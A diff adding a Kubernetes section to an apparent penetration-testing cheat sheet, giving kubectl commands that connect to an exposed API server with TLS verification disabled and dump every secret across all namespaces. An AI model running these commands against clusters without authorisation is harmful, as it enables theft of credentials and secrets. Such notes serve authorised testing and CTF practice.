@@ -226,6 +226,17 @@ https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
 
 with basic http auth (website shows popup asking for creds) you can clear prefixing url. ie http://username:password@url.com
 
+## Kubernetes
+
+If kubeconfig.yaml and Kubernetes API port (usually 6443) is exposed, use the following commands to enumerate:
+
+```bash
+$kubeconfig=/path/to/kubeconfig.yaml
+
+kubectl config --kubeconfig=$kubeconfig set-cluster default   --server=https://server_ip:port   --insecure-skip-tls-verify=true
+
+kubectl --kubeconfig=$kubeconfig get secrets --all-namespaces -o yaml
+```
 
 ## Meterpreter
 
